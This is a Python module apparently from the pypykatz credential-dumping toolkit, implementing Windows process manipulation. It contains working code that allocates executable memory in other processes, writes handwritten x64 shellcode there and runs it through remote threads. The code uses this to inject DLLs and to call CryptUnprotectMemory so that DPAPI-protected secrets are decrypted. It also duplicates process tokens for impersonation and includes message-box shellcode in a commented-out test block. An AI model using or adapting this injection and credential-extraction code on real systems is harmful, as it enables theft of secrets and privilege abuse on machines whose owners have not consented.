from .common.version import *
from .common.live_reader_ctypes import *
from pypykatz.commons.winapi.local.function_defs.kernel32 import LoadLibraryW, GetProcAddressW, VirtualProtectEx, VirtualAllocEx, VirtualFreeEx, CreateRemoteThread
from pypykatz.commons.winapi.local.function_defs.advapi32 import OpenProcessToken, DuplicateTokenEx
from minidump.streams.SystemInfoStream import PROCESSOR_ARCHITECTURE
import ntpath
import os
import math

PROCESS_QUERY_LIMITED_INFORMATION = 0x1000

# Token access rights
TOKEN_ASSIGN_PRIMARY	= 0x0001
TOKEN_DUPLICATE		 = 0x0002
TOKEN_IMPERSONATE	   = 0x0004
TOKEN_QUERY			 = 0x0008
TOKEN_QUERY_SOURCE	  = 0x0010
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ADJUST_GROUPS	 = 0x0040
TOKEN_ADJUST_DEFAULT	= 0x0080
TOKEN_ADJUST_SESSIONID  = 0x0100
TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
		TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
		TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
		TOKEN_ADJUST_SESSIONID)

SecurityAnonymous	   = 0
SecurityIdentification  = 1
SecurityImpersonation   = 2
SecurityDelegation	  = 3

TokenPrimary		= 1
TokenImpersonation  = 2

#dont ask me...
#TOKEN_MANIP_ACCESS = (TOKEN_QUERY | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_QUERY_SOURCE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | (131072 | 4))

class Module:
	def __init__(self):
		self.name = None
		self.baseaddress = None
		self.size = None
		self.endaddress = None
		self.pages = []
		
		self.versioninfo = None
		self.checksum = None
		self.timestamp = None
		
	def inrange(self, addr):
		return self.baseaddress <= addr < self.endaddress
	
	@staticmethod
	def parse(name, module_info, timestamp):
		m = Module()
		m.name = name
		m.baseaddress = module_info.lpBaseOfDll
		m.size = module_info.SizeOfImage
		m.endaddress = m.baseaddress + m.size
		
		m.timestamp = timestamp
		
		return m
		
	def __str__(self):
		return '%s %s %s %s %s' % (self.name, hex(self.baseaddress), hex(self.size), hex(self.endaddress), self.timestamp )

class Page:
	def __init__(self):
		self.BaseAddress = None
		self.AllocationBase  = None
		self.AllocationProtect  = None
		self.RegionSize  = None
		self.EndAddress = None
		
		self.data = None
	
	@staticmethod
	def parse(page_info):
		p = Page()
		p.BaseAddress = page_info.BaseAddress
		p.AllocationBase  = page_info.AllocationBase
		p.AllocationProtect  = page_info.AllocationProtect
		p.RegionSize  = min(page_info.RegionSize, 100*1024*1024) # TODO: need this currently to stop infinite search
		p.EndAddress  = page_info.BaseAddress + page_info.RegionSize
		return p
		
	def read_data(self, process_handle):
		self.data = ReadProcessMemory(process_handle, self.BaseAddress, self.RegionSize)
		
	def inrange(self, addr):
		return self.BaseAddress <= addr < self.EndAddress
		
	def search(self, pattern, process_handle):
		if len(pattern) > self.RegionSize:
			return []
		data = ReadProcessMemory(process_handle, self.BaseAddress, self.RegionSize)
		fl = []
		offset = 0
		while len(data) > len(pattern):
			marker = data.find(pattern)
			if marker == -1:
				return fl
			fl.append(marker + offset + self.BaseAddress)
			data = data[marker+1:]
		

class Process:
	def __init__(self, pid = None, name = None, access = PROCESS_ALL_ACCESS, open = True):
		self.pid = pid
		self.name = name
		self.access = access


		self.sysinfo = None
		self.processor_architecture = None


		self.phandle = None
		self.modules = []
		self.pages = []

		if open is True:
			self.open()
	
	def open(self):
		self.sysinfo = GetSystemInfo()
		self.processor_architecture = PROCESSOR_ARCHITECTURE(self.sysinfo.id.w.wProcessorArchitecture)
		if self.phandle is None:
			if self.pid is None:
				if self.name is None:
					raise Exception('Process name or PID or opened handle must be provided')
				
				self.pid = pid_for_name(self.name)
			
			self.phandle = OpenProcess(self.access, False, self.pid)
			if self.phandle is None:
				raise Exception('Failed to open %s(%s) Reason: %s' % (ctypes.WinError(), self.name, self.pid))
	
	def list_modules(self):
		self.modules = []
		module_handles = EnumProcessModules(self.phandle)
		for module_handle in module_handles:
			module_file_path = GetModuleFileNameExW(self.phandle, module_handle)
			logging.log(1, module_file_path)
			timestamp = 0
			if ntpath.basename(module_file_path).lower() == 'msv1_0.dll':
				timestamp = int(os.stat(module_file_path).st_ctime)
				self.msv_dll_timestamp = timestamp
			modinfo = GetModuleInformation(self.phandle, module_handle)
			self.modules.append(Module.parse(module_file_path, modinfo, timestamp))
		return self.modules
	
	def list_pages(self):
		self.pages = []
		current_address = self.sysinfo.lpMinimumApplicationAddress
		while current_address < self.sysinfo.lpMaximumApplicationAddress:
			page_info = VirtualQueryEx(self.phandle, current_address)
			self.pages.append(Page.parse(page_info))
			
			current_address += page_info.RegionSize
	
	def page_find_for_addr(self, addr):
		self.list_pages()
		selected_page = None
		for page in self.pages:
			if page.inrange(addr):
				selected_page = page
		if selected_page is None:
			raise Exception('Address not found in pages!')
		return selected_page

	def page_change_protect(self, addr, flags = PAGE_EXECUTE_READWRITE):
		selected_page = self.page_find_for_addr(addr)
		return VirtualProtectEx(self.phandle, selected_page.BaseAddress, selected_page.RegionSize, flags)

	def page_alloc(self, size, addr = 0, allocation_type = MEM_COMMIT | MEM_RESERVE, allocation_protect = PAGE_EXECUTE_READWRITE):
		return VirtualAllocEx(self.phandle, lpAddress = addr, dwSize = size, flAllocationType = allocation_type, flProtect = allocation_protect)

	def page_free(self, addr, free_type = MEM_RELEASE):
		selected_page = self.page_find_for_addr(addr)
		dwsize = 0 if free_type == MEM_RELEASE else selected_page.RegionSize
		return VirtualFreeEx(self.phandle, selected_page.BaseAddress, dwsize, dwFreeType = free_type)

	def read(self, pos, amount):
		return ReadProcessMemory(self.phandle, pos, amount)

	def write(self, pos, buffer):
		return WriteProcessMemory(self.phandle, pos, buffer)

	def create_thread(self, start_addr):
		return CreateRemoteThread(self.phandle, None, 0, start_addr, None, 0)

	def find_module_by_name(self, module_name):
		if len(self.modules) == 0:
			self.list_modules()
		for module in self.modules:
			#print(module.name)
			if module.name.lower().find(module_name.lower()) != -1:
				#print('Found remote DLL!')
				return module

	def get_remote_function_addr(self, dll_name, function_name, force_load = False):
		module_handle = LoadLibraryW(dll_name)
		#print(module_handle)
		function_addr_total = GetProcAddressW(module_handle, function_name)
		#print('function_addr %s' % hex(function_addr_total))

		modinfo = GetModuleInformation(GetCurrentProcess(), module_handle)
		module = Module.parse(dll_name, modinfo, None)
		function_addr_offset = module.baseaddress - function_addr_total

		#print('function_addr_offset %s' % hex(function_addr_offset))
		
		module = self.find_module_by_name(dll_name)
		if module is None:
			if force_load is True:
				self.load_dll(dll_name)
				self.list_modules()
				module = self.find_module_by_name(dll_name)
			if module is None:
				return None

		return module.baseaddress - function_addr_offset

	@staticmethod
	def int_to_asm(x, bitsize = 64):
		return x.to_bytes(bitsize//8, byteorder = 'little', signed = False)

	def invoke_remote_function(self, enclave, fnc_addr, p1_addr, p2_addr, p3_addr, exitthread_addr):
		#https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-160
		#https://defuse.ca/online-x86-assembler.htm#disassembly
		
		

		#p1_addr = 0
		#p2_addr = 0
		#p3_addr = 0
		#fnc_addr = 0

		#first_param
		p1 = b'\x48\xb9' + Process.int_to_asm(p1_addr) # MOVABS RCX,<ADDR>
		#second_param
		p2 = b'\x48\xba' + Process.int_to_asm(p2_addr) # MOVABS RDX,<ADDR>
		#third_param
		p3 = b'\x49\xb8' + Process.int_to_asm(p3_addr) # MOVABS R8,<ADDR>
		#load function address to RAX
		fnc = b'\x48\xb8' + Process.int_to_asm(fnc_addr) # MOVABS RAX,<ADDR>
		#CALL function address (in RAX)
		call_fnc = b'\xff\xd0' # CALL RAX

		exit_code_set = b'\x48\x89\xC1' # mov rcx, rax
		thread_exit_fnc = b'\x48\xb8' + Process.int_to_asm(exitthread_addr) # MOVABS RAX,<ADDR>
		#CALL function address (in RAX)
		call_thread_exit_fnc = b'\xff\xd0' # CALL RAX
		
		code = p3 + p2 + p1 + fnc + call_fnc + exit_code_set + thread_exit_fnc + call_thread_exit_fnc
		#print('code: %s' % code.hex())
		self.write(enclave, code)
		#input()

		thread_handle, thread_id = self.create_thread(enclave)
		#print(thread_handle)
		thread_exit = GetExitCodeThread(thread_handle)
		#print(thread_exit)

	def load_dll(self, dll_path):
		if dll_path[-1] != '\x00':
			dll_path += '\x00'

		loadlibrary_addr = self.get_remote_function_addr("Kernel32.dll", "LoadLibraryW")
		exitthread_addr = self.get_remote_function_addr("Kernel32.dll", "ExitThread")


		code_cave = self.page_alloc(2048)
		dllname_page = self.page_alloc(2048)
		self.write(dllname_page, dll_path.encode('utf-16-le'))

		code  = b''
		code += b'\x48\xb9' + Process.int_to_asm(dllname_page) # MOVABS RCX,<ADDR>
		code += b'\x48\xb8' + Process.int_to_asm(loadlibrary_addr) # MOVABS RAX,<ADDR>
		code += b'\xff\xd0' # CALL RAX
		code += b''
		code += b'\x48\x89\xC1' # mov rcx, rax
		code += b'\x48\xb8' + Process.int_to_asm(exitthread_addr) # MOVABS RAX,<ADDR>
		code += b'\xff\xd0' # CALL RAX
		
		self.write(code_cave, code)
		thread_handle, thread_id = self.create_thread(code_cave)
		WaitForSingleObject(thread_handle, 100) #waiting for the shellcode to finish...

		self.page_free(code_cave)


	def dpapi_memory_unprotect(self, protected_blob_addr, protected_blob_size, flags = 0):
		protected_blob_size = 16 * math.ceil(protected_blob_size/16)
		return self.dpapi_memory_unprotect_x64(protected_blob_addr, protected_blob_size, flags)

	def dpapi_memory_unprotect_x64(self, protected_blob_addr, protected_blob_size, flags = 0):
		# https://docs.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectmemory
		#CRYPTPROTECTMEMORY_SAME_PROCESS 0 
		#CRYPTPROTECTMEMORY_CROSS_PROCESS 1
		#CRYPTPROTECTMEMORY_SAME_LOGON 2

		
		#finding remote function addresses
		protectmemory_addr = self.get_remote_function_addr("Crypt32.dll", "CryptProtectMemory", True)
		unprotectmemory_addr = self.get_remote_function_addr("Crypt32.dll", "CryptUnprotectMemory", True)
		exitthread_addr = self.get_remote_function_addr("Kernel32.dll", "ExitThread")
		copymemory_addr = self.get_remote_function_addr("NtDll.dll", "RtlCopyMemory")
		#print('unprotectmemory_addr %s' % hex(unprotectmemory_addr))
		#print('exitthread_addr %s' % hex(exitthread_addr))
		#print('copymemory_addr %s' % hex(copymemory_addr))


		# allocating memory in remote process
		code_cave = self.page_alloc(1024)
		result_cave = self.page_alloc(protected_blob_size*10)
		#print('code_cave : %s' % hex(code_cave))
		#print('result_cave : %s' % hex(result_cave))


		#building code
		code  = b''
		code += b'\x48\xb9' + Process.int_to_asm(protected_blob_addr) # MOVABS RCX,<ADDR>
		code += b'\x48\xba' + Process.int_to_asm(protected_blob_size) # MOVABS RDX,<ADDR>
		code += b'\x49\xb8' + Process.int_to_asm(flags) # MOVABS R8,<ADDR>
		code += b'\x48\xb8' + Process.int_to_asm(unprotectmemory_addr) # MOVABS RAX,<ADDR>
		code += b'\xff\xd0' # CALL RAX
		code += b''
		code += b'\x48\xb9' + Process.int_to_asm(result_cave) # MOVABS RCX,<ADDR>
		code += b'\x48\xba' + Process.int_to_asm(protected_blob_addr) # MOVABS RDX,<ADDR>
		code += b'\x49\xb8' + Process.int_to_asm(protected_blob_size) # MOVABS R8,<ADDR>
		code += b'\x48\xb8' + Process.int_to_asm(copymemory_addr) # MOVABS RAX,<ADDR>
		code += b'\xff\xd0' # CALL RAX
		code += b''
		code += b'\x48\xb9' + Process.int_to_asm(protected_blob_addr) # MOVABS RCX,<ADDR>
		code += b'\x48\xba' + Process.int_to_asm(protected_blob_size) # MOVABS RDX,<ADDR>
		code += b'\x49\xb8' + Process.int_to_asm(flags) # MOVABS R8,<ADDR>
		code += b'\x48\xb8' + Process.int_to_asm(protectmemory_addr) # MOVABS RAX,<ADDR>
		code += b'\xff\xd0' # CALL RAX
		code += b''
		code += b'\x48\x89\xC1' # mov rcx, rax
		code += b'\x48\xb8' + Process.int_to_asm(exitthread_addr) # MOVABS RAX,<ADDR>
		code += b'\xff\xd0' # CALL RAX
		
	
		#print('code: %s' % code.hex())
		self.write(code_cave, code)

		thread_handle, thread_id = self.create_thread(code_cave)
		WaitForSingleObject(thread_handle, 100) #waiting for the shellcode to finish...
		thread_exit_code = GetExitCodeThread(thread_handle)
		#print(thread_exit_code)

		result = self.read(result_cave, protected_blob_size)

		self.page_free(code_cave)
		self.page_free(result_cave)
		return result
	
	def get_process_token(self, dwDesiredAccess = TOKEN_ALL_ACCESS):
		return OpenProcessToken(self.phandle, dwDesiredAccess)
	
	def duplicate_token(self, dwDesiredAccess = TOKEN_ALL_ACCESS, ImpersonationLevel = SecurityImpersonation, TokenType = 2):
		#proc_handle = self.api.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
		token_handle = OpenProcessToken(self.phandle, TOKEN_DUPLICATE)
		cloned_token = DuplicateTokenEx(
			token_handle, 
			dwDesiredAccess = dwDesiredAccess, 
			ImpersonationLevel = ImpersonationLevel, 
			TokenType = TokenType
		)
		CloseHandle(token_handle)
		return cloned_token
if __name__ == '__main__':
	calc = Process(pid=16236)
	calc.list_pages()
	calc.list_modules()
	print(1)
	"""
	

	data = calc.read(140705499119616, 0x100)
	print(data)
	new_addr = calc.page_alloc(0x1000)
	print(new_addr)
	data = calc.read(new_addr, 0x100)
	print(data)
	data = calc.write(new_addr, b'HELLO WORLD!')
	print(data)
	data = calc.read(new_addr, 0x100)
	print(data)
	x = calc.page_change_protect(new_addr, flags = PAGE_EXECUTE_READ)
	print(x)
	try:
		data = calc.write(new_addr, b'A'*20)
		print(data)
	except:
		print('Error but it is expected')
	calc.page_change_protect(new_addr)
	data = calc.write(new_addr, b'A'*20)
	print(data)
	data = calc.read(new_addr, 0x100)
	print(data)

	calc.page_free(new_addr)
	###################################################################################
	msgbox = b"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42" +\
				b"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03" + \
				b"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b" + \
				b"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e" +\
				b"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"+\
				b"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"+\
				b"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"+\
				b"\x49\x0b\x31\xc0\x51\x50\xff\xd7"
	
	new_addr = calc.page_alloc(0x1000)
	print(hex(new_addr))
	data = calc.write(new_addr, msgbox)
	print(data)
	
	data = calc.read(new_addr, 0x100)
	print(data)

	calc.create_thread(new_addr)


	#calc.page_free(new_addr)
	"""
	#unprotectmemory_addr = calc.get_remote_function_addr("Crypt32.dll", "CryptUnprotectMemory")
	#print('unprotectmemory_addr %s' % hex(unprotectmemory_addr))
	#exitthread_addr = calc.get_remote_function_addr("Kernel32.dll", "ExitThread")
	#print('exitthread_addr %s' % hex(exitthread_addr))
	#copymemory_addr = calc.get_remote_function_addr("Kernel32.dll", "CopyMemory")
	#print('copymemory_addr %s' % hex(exitthread_addr))
	#cave = calc.page_alloc(0x1000)
	#print('enclave : %s' % hex(cave))
	#input()
	#calc.invoke_remote_function(cave, unprotectmemory_addr, 0x0000019DE0535440, 64, 0, exitthread_addr)
	calc.dpapi_memory_unprotect(0x0000027E24B918B0, 64, same_process = 0)

